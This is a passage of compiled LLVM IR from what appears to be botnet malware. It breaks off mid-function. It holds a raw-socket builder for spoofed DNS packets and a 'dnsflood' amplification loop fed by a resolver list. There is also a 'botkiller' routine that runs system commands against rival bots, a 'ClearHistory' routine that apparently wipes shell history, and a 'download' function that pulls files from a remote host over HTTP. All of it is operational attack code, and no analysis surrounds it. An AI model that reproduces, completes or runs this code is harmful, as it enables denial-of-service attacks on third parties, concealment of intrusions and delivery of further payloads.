  %47 = getelementptr inbounds i8, i8* %46, i64 8
  store i8* %47, i8** %15, align 8
  %48 = load i8*, i8** %15, align 8
  %49 = bitcast [128 x i8]* %9 to i8*
  %50 = load i8*, i8** %11, align 8
  %51 = call i64 @strlen(i8* noundef %50) #11
  %52 = add i64 %51, 1
  %53 = add i64 12, %52
  %54 = add i64 %53, 4
  %55 = add i64 %54, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %48, i8* align 16 %49, i64 %55, i1 false)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %56, align 4
  %57 = call zeroext i16 @htons(i16 noundef zeroext 53) #15
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i8*, i8** %7, align 8
  %60 = call i32 @inet_addr(i8* noundef %59) #12
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %62 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %61, i32 0, i32 0
  store i32 %60, i32* %62, align 4
  %63 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i64 0, i64 0
  %64 = bitcast i8* %63 to %struct.iphdr*
  store %struct.iphdr* %64, %struct.iphdr** %18, align 8
  %65 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %66 = bitcast %struct.iphdr* %65 to i8*
  %67 = load i8, i8* %66, align 4
  %68 = and i8 %67, 15
  %69 = or i8 %68, 64
  store i8 %69, i8* %66, align 4
  %70 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %71 = bitcast %struct.iphdr* %70 to i8*
  %72 = load i8, i8* %71, align 4
  %73 = and i8 %72, -16
  %74 = or i8 %73, 5
  store i8 %74, i8* %71, align 4
  %75 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %76 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %75, i32 0, i32 1
  store i8 0, i8* %76, align 1
  %77 = load i8*, i8** %11, align 8
  %78 = call i64 @strlen(i8* noundef %77) #11
  %79 = add i64 %78, 1
  %80 = add i64 40, %79
  %81 = add i64 %80, 4
  %82 = trunc i64 %81 to i16
  %83 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %84 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %83, i32 0, i32 2
  store i16 %82, i16* %84, align 2
  %85 = call i32 @rand_cmwc()
  %86 = and i32 %85, -1
  %87 = call i32 @htonl(i32 noundef %86) #15
  %88 = trunc i32 %87 to i16
  %89 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 3
  store i16 %88, i16* %90, align 4
  %91 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %92 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %91, i32 0, i32 4
  store i16 0, i16* %92, align 2
  %93 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %94 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %93, i32 0, i32 5
  store i8 64, i8* %94, align 4
  %95 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %96 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %95, i32 0, i32 6
  store i8 17, i8* %96, align 1
  %97 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i32 0, i32 7
  store i16 0, i16* %98, align 2
  %99 = load i8*, i8** %5, align 8
  %100 = call i32 @inet_addr(i8* noundef %99) #12
  %101 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %102 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %101, i32 0, i32 8
  store i32 %100, i32* %102, align 4
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %104 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %103, i32 0, i32 0
  %105 = load i32, i32* %104, align 4
  %106 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %107 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %106, i32 0, i32 9
  store i32 %105, i32* %107, align 4
  %108 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i64 0, i64 0
  %109 = bitcast i8* %108 to i16*
  %110 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %111 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %110, i32 0, i32 2
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* noundef %109, i32 noundef %113)
  %115 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %116 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %115, i32 0, i32 7
  store i16 %114, i16* %116, align 2
  %117 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i64 0, i64 0
  %118 = getelementptr inbounds i8, i8* %117, i64 20
  %119 = bitcast i8* %118 to %struct.udphdr*
  store %struct.udphdr* %119, %struct.udphdr** %19, align 8
  %120 = load i32, i32* %6, align 4
  %121 = trunc i32 %120 to i16
  %122 = call zeroext i16 @htons(i16 noundef zeroext %121) #15
  %123 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %124 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.2* %124 to %struct.anon.3*
  %126 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %125, i32 0, i32 0
  store i16 %122, i16* %126, align 2
  %127 = call zeroext i16 @htons(i16 noundef zeroext 53) #15
  %128 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i32 0, i32 0
  %130 = bitcast %union.anon.2* %129 to %struct.anon.3*
  %131 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %130, i32 0, i32 1
  store i16 %127, i16* %131, align 2
  %132 = load i8*, i8** %11, align 8
  %133 = call i64 @strlen(i8* noundef %132) #11
  %134 = add i64 %133, 1
  %135 = add i64 20, %134
  %136 = add i64 %135, 4
  %137 = trunc i64 %136 to i16
  %138 = call zeroext i16 @htons(i16 noundef zeroext %137) #15
  %139 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %140 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %139, i32 0, i32 0
  %141 = bitcast %union.anon.2* %140 to %struct.anon.3*
  %142 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %141, i32 0, i32 2
  store i16 %138, i16* %142, align 2
  %143 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %144 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.2* %144 to %struct.anon.3*
  %146 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %145, i32 0, i32 3
  store i16 0, i16* %146, align 2
  %147 = load i8*, i8** %5, align 8
  %148 = call i32 @inet_addr(i8* noundef %147) #12
  %149 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 0
  store i32 %148, i32* %149, align 4
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %151 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 4
  %153 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 1
  store i32 %152, i32* %153, align 4
  %154 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 2
  store i8 0, i8* %154, align 4
  %155 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 3
  store i8 17, i8* %155, align 1
  %156 = load i8*, i8** %11, align 8
  %157 = call i64 @strlen(i8* noundef %156) #11
  %158 = add i64 %157, 1
  %159 = add i64 20, %158
  %160 = add i64 %159, 4
  %161 = trunc i64 %160 to i16
  %162 = call zeroext i16 @htons(i16 noundef zeroext %161) #15
  %163 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 4
  store i16 %162, i16* %163, align 2
  %164 = load i8*, i8** %11, align 8
  %165 = call i64 @strlen(i8* noundef %164) #11
  %166 = add i64 %165, 1
  %167 = add i64 32, %166
  %168 = add i64 %167, 4
  %169 = trunc i64 %168 to i32
  store i32 %169, i32* %21, align 4
  %170 = load i32, i32* %21, align 4
  %171 = sext i32 %170 to i64
  %172 = call noalias i8* @malloc(i64 noundef %171) #12
  store i8* %172, i8** %16, align 8
  %173 = load i8*, i8** %16, align 8
  %174 = bitcast %struct.ps_hdr* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %173, i8* align 4 %174, i64 12, i1 false)
  %175 = load i8*, i8** %16, align 8
  %176 = getelementptr inbounds i8, i8* %175, i64 12
  %177 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %178 = bitcast %struct.udphdr* %177 to i8*
  %179 = load i8*, i8** %11, align 8
  %180 = call i64 @strlen(i8* noundef %179) #11
  %181 = add i64 %180, 1
  %182 = add i64 20, %181
  %183 = add i64 %182, 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %176, i8* align 2 %178, i64 %183, i1 false)
  %184 = load i8*, i8** %16, align 8
  %185 = bitcast i8* %184 to i16*
  %186 = load i32, i32* %21, align 4
  %187 = call zeroext i16 @csum(i16* noundef %185, i32 noundef %186)
  %188 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.2* %189 to %struct.anon.3*
  %191 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %190, i32 0, i32 3
  store i16 %187, i16* %191, align 2
  %192 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 255) #12
  store i32 %192, i32* %22, align 4
  %193 = load i32, i32* %22, align 4
  %194 = icmp eq i32 %193, -1
  br i1 %194, label %195, label %196

195:                                              ; preds = %4
  br label %212

196:                                              ; preds = %4
  %197 = load i32, i32* %22, align 4
  %198 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i64 0, i64 0
  %199 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  %201 = load i16, i16* %200, align 2
  %202 = zext i16 %201 to i64
  %203 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %204 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %204, %struct.sockaddr** %203, align 8
  %205 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %206 = load %struct.sockaddr*, %struct.sockaddr** %205, align 8
  %207 = call i64 @sendto(i32 noundef %197, i8* noundef %198, i64 noundef %202, i32 noundef 0, %struct.sockaddr* %206, i32 noundef 16)
  br label %208

208:                                              ; preds = %196
  %209 = load i8*, i8** %16, align 8
  call void @free(i8* noundef %209) #12
  %210 = load i32, i32* %22, align 4
  %211 = call i32 @close(i32 noundef %210)
  br label %212

212:                                              ; preds = %208, %195
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @dnsflood(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_data*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %2, align 8
  %11 = call i32 @listFork()
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %1
  ret void

14:                                               ; preds = %1
  %15 = load i8*, i8** %2, align 8
  %16 = bitcast i8* %15 to %struct.thread_data*
  store %struct.thread_data* %16, %struct.thread_data** %3, align 8
  %17 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %18 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %17, i32 0, i32 1
  %19 = load i8*, i8** %18, align 8
  store i8* %19, i8** %4, align 8
  %20 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %21 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %20, i32 0, i32 2
  %22 = load i32, i32* %21, align 8
  store i32 %22, i32* %5, align 4
  %23 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %24 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %23, i32 0, i32 4
  %25 = load i32, i32* %24, align 8
  store i32 %25, i32* %6, align 4
  %26 = call i64 @time(i64* noundef null) #12
  %27 = call i32 @getpid() #12
  %28 = sext i32 %27 to i64
  %29 = xor i64 %26, %28
  %30 = trunc i64 %29 to i32
  call void @init_rand(i32 noundef %30)
  store i32 0, i32* %8, align 4
  %31 = call i64 @time(i64* noundef null) #12
  %32 = load i32, i32* %6, align 4
  %33 = sext i32 %32 to i64
  %34 = add nsw i64 %31, %33
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %9, align 4
  br label %36

36:                                               ; preds = %85, %14
  %37 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i64 0, i64 0))
  store %struct._IO_FILE* %37, %struct._IO_FILE** %10, align 8
  br label %38

38:                                               ; preds = %84, %36
  %39 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %41 = call i8* @fgets(i8* noundef %39, i32 noundef 100, %struct._IO_FILE* noundef %40)
  %42 = icmp ne i8* %41, null
  br i1 %42, label %43, label %85

43:                                               ; preds = %38
  %44 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %45 = call i64 @strlen(i8* noundef %44) #11
  %46 = sub i64 %45, 1
  %47 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 10
  br i1 %50, label %59, label %51

51:                                               ; preds = %43
  %52 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %53 = call i64 @strlen(i8* noundef %52) #11
  %54 = sub i64 %53, 1
  %55 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 13
  br i1 %58, label %59, label %64

59:                                               ; preds = %51, %43
  %60 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %61 = call i64 @strlen(i8* noundef %60) #11
  %62 = sub i64 %61, 1
  %63 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %62
  store i8 0, i8* %63, align 1
  br label %64

64:                                               ; preds = %59, %51
  %65 = load i8*, i8** %4, align 8
  %66 = load i32, i32* %5, align 4
  %67 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  call void @dns_send(i8* noundef %65, i32 noundef %66, i8* noundef %67, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.420, i64 0, i64 0))
  %68 = load volatile i32, i32* @pps, align 4
  %69 = add i32 %68, 1
  store volatile i32 %69, i32* @pps, align 4
  %70 = load i32, i32* %8, align 4
  %71 = load volatile i32, i32* @limiter, align 4
  %72 = icmp sge i32 %70, %71
  br i1 %72, label %73, label %76

73:                                               ; preds = %64
  store i32 0, i32* %8, align 4
  %74 = load volatile i32, i32* @sleeptime, align 4
  %75 = call i32 @usleep(i32 noundef %74)
  br label %76

76:                                               ; preds = %73, %64
  %77 = load i32, i32* %8, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %8, align 4
  %79 = call i64 @time(i64* noundef null) #12
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = icmp sgt i64 %79, %81
  br i1 %82, label %83, label %84

83:                                               ; preds = %76
  call void @exit(i32 noundef 0) #16
  unreachable

84:                                               ; preds = %76
  br label %38, !llvm.loop !62

85:                                               ; preds = %38
  %86 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %87 = call i32 @fclose(%struct._IO_FILE* noundef %86)
  br label %36
}

declare noalias %struct._IO_FILE* @fopen(i8* noundef, i8* noundef) #3

declare i8* @fgets(i8* noundef, i32 noundef, %struct._IO_FILE* noundef) #3

declare i32 @fclose(%struct._IO_FILE* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  br label %3

3:                                                ; preds = %33, %0
  store i32 0, i32* %1, align 4
  br label %4

4:                                                ; preds = %30, %3
  %5 = load i32, i32* %1, align 4
  %6 = icmp slt i32 %5, 9
  br i1 %6, label %7, label %33

7:                                                ; preds = %4
  %8 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %8, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i64 0, i64 0)) #12
  %10 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %11 = load i32, i32* %1, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = call i8* @strcat(i8* noundef %10, i8* noundef %14) #12
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %17 = call i32 @system(i8* noundef %16)
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %18, i8* noundef getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i64 0, i64 0)) #12
  %20 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %21 = load i32, i32* %1, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcat(i8* noundef %20, i8* noundef %24) #12
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %27 = call i8* @strcat(i8* noundef %26, i8* noundef getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0)) #12
  %28 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i64 0, i64 0
  %29 = call i32 @system(i8* noundef %28)
  br label %30

30:                                               ; preds = %7
  %31 = load i32, i32* %1, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %1, align 4
  br label %4, !llvm.loop !63

33:                                               ; preds = %4
  %34 = call i32 @sleep(i32 noundef 5)
  br label %3
}

declare i32 @system(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @ClearHistory() #0 {
  %1 = call i32 @system(i8* noundef getelementptr inbounds ([22 x i8], [22 x i8]* @.str.423, i64 0, i64 0))
  %2 = call i32 @system(i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.424, i64 0, i64 0))
  %3 = call i32 @system(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.425, i64 0, i64 0))
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @binsBins() #0 {
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #12
  store i32 %2, i32* %1, align 4
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %8

4:                                                ; preds = %0
  %5 = load i8*, i8** @rekdevice, align 8
  %6 = call i32 @system(i8* noundef %5)
  %7 = call i32 @sleep(i32 noundef 20)
  br label %11

8:                                                ; preds = %0
  %9 = load i32, i32* %1, align 4
  %10 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i64 0, i64 0), i32 noundef %9)
  br label %11

11:                                               ; preds = %8, %4
  ret void
}

declare i32 @printf(i8* noundef, ...) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @download(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i64, align 8
  %11 = alloca [1024 x i8], align 16
  %12 = alloca %struct._IO_FILE*, align 8
  %13 = alloca [4096 x i8], align 16
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %19 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  store i32 %19, i32* %6, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

21:                                               ; preds = %2
  store i32 3, i32* %3, align 4
  br label %198

22:                                               ; preds = %2
  %23 = load i8*, i8** %4, align 8
  %24 = call i32 @strncmp(i8* noundef %23, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.427, i64 0, i64 0), i64 noundef 7) #11
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %31, label %26

26:                                               ; preds = %22
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 7
  %30 = call i8* @strcpy(i8* noundef %27, i8* noundef %29) #12
  br label %35

31:                                               ; preds = %22
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %33 = load i8*, i8** %4, align 8
  %34 = call i8* @strcpy(i8* noundef %32, i8* noundef %33) #12
  br label %35

35:                                               ; preds = %31, %26
  store i32 0, i32* %7, align 4
  br label %36

36:                                               ; preds = %52, %35
  %37 = load i32, i32* %7, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %40 = call i64 @strlen(i8* noundef %39) #11
  %41 = icmp ult i64 %38, %40
  br i1 %41, label %42, label %49

42:                                               ; preds = %36
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp ne i32 %47, 47
  br label %49

49:                                               ; preds = %42, %36
  %50 = phi i1 [ false, %36 ], [ %48, %42 ]
  br i1 %50, label %51, label %55

51:                                               ; preds = %49
  br label %52

52:                                               ; preds = %51
  %53 = load i32, i32* %7, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %7, align 4
  br label %36, !llvm.loop !64

55:                                               ; preds = %49
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %57
  store i8 0, i8* %58, align 1
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = call zeroext i16 @htons(i16 noundef zeroext 80) #15
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %60, i16* %61, align 2
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %63 = call i32 @inet_addr(i8* noundef %62) #12
  %64 = zext i32 %63 to i64
  store i64 %64, i64* %10, align 8
  %65 = icmp eq i64 %64, -1
  br i1 %65, label %66, label %83

66:                                               ; preds = %55
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %68 = call %struct.hostent* @gethostbyname(i8* noundef %67)
  store %struct.hostent* %68, %struct.hostent** %14, align 8
  %69 = icmp eq %struct.hostent* %68, null
  br i1 %69, label %70, label %71

70:                                               ; preds = %66
  store i32 2, i32* %3, align 4
  br label %198

71:                                               ; preds = %66
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %73 = bitcast %struct.in_addr* %72 to i8*
  %74 = load %struct.hostent*, %struct.hostent** %14, align 8
  %75 = getelementptr inbounds %struct.hostent, %struct.hostent* %74, i32 0, i32 4
  %76 = load i8**, i8*** %75, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = load %struct.hostent*, %struct.hostent** %14, align 8
  %80 = getelementptr inbounds %struct.hostent, %struct.hostent* %79, i32 0, i32 3
  %81 = load i32, i32* %80, align 4
  %82 = sext i32 %81 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %73, i8* align 1 %78, i64 %82, i1 false)
  br label %88

83:                                               ; preds = %55
  %84 = load i64, i64* %10, align 8
  %85 = trunc i64 %84 to i32
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  store i32 %85, i32* %87, align 4
  br label %88

88:                                               ; preds = %83, %71
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %90 = bitcast [8 x i8]* %89 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %90, i8 0, i64 8, i1 false)
  %91 = load i32, i32* %6, align 4
  %92 = bitcast %union.__CONST_SOCKADDR_ARG* %15 to %struct.sockaddr**
  %93 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %93, %struct.sockaddr** %92, align 8
  %94 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %15, i32 0, i32 0
  %95 = load %struct.sockaddr*, %struct.sockaddr** %94, align 8
  %96 = call i32 @connect(i32 noundef %91, %struct.sockaddr* %95, i32 noundef 16)
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %99

98:                                               ; preds = %88
  store i32 1, i32* %3, align 4
  br label %198

99:                                               ; preds = %88
  %100 = load i32, i32* %6, align 4
  %101 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = getelementptr inbounds i8, i8* %104, i64 1
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 0
  %107 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %100, i8* noundef getelementptr inbounds ([132 x i8], [132 x i8]* @.str.428, i64 0, i64 0), i8* noundef %105, i8* noundef %106)
  %108 = load i8*, i8** %5, align 8
  %109 = call noalias %struct._IO_FILE* @fopen(i8* noundef %108, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.429, i64 0, i64 0))
  store %struct._IO_FILE* %109, %struct._IO_FILE** %12, align 8
  br label %110

110:                                              ; preds = %159, %99
  %111 = load i32, i32* %6, align 4
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %113 = call i64 @recv(i32 noundef %111, i8* noundef %112, i64 noundef 4096, i32 noundef 0)
  %114 = trunc i64 %113 to i32
  store i32 %114, i32* %16, align 4
  %115 = icmp sle i32 %114, 0
  br i1 %115, label %116, label %117

116:                                              ; preds = %110
  br label %160

117:                                              ; preds = %110
  %118 = load i32, i32* %16, align 4
  %119 = icmp slt i32 %118, 4096
  br i1 %119, label %120, label %124

120:                                              ; preds = %117
  %121 = load i32, i32* %16, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %122
  store i8 0, i8* %123, align 1
  br label %124

124:                                              ; preds = %120, %117
  store i32 0, i32* %8, align 4
  br label %125

125:                                              ; preds = %156, %124
  %126 = load i32, i32* %8, align 4
  %127 = load i32, i32* %16, align 4
  %128 = icmp slt i32 %126, %127
  br i1 %128, label %129, label %159

129:                                              ; preds = %125
  %130 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 0
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8, i8* %130, i64 %132
  %134 = call i32 @strncmp(i8* noundef %133, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i64 0, i64 0), i64 noundef 4) #11
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %155, label %136

136:                                              ; preds = %129
  %137 = load i32, i32* %8, align 4
  %138 = add nsw i32 %137, 4
  store i32 %138, i32* %8, align 4
  br label %139

139:                                              ; preds = %151, %136
  %140 = load i32, i32* %8, align 4
  %141 = load i32, i32* %16, align 4
  %142 = icmp slt i32 %140, %141
  br i1 %142, label %143, label %154

143:                                              ; preds = %139
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %145
  %147 = load i8, i8* %146, align 1
  %148 = sext i8 %147 to i32
  %149 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
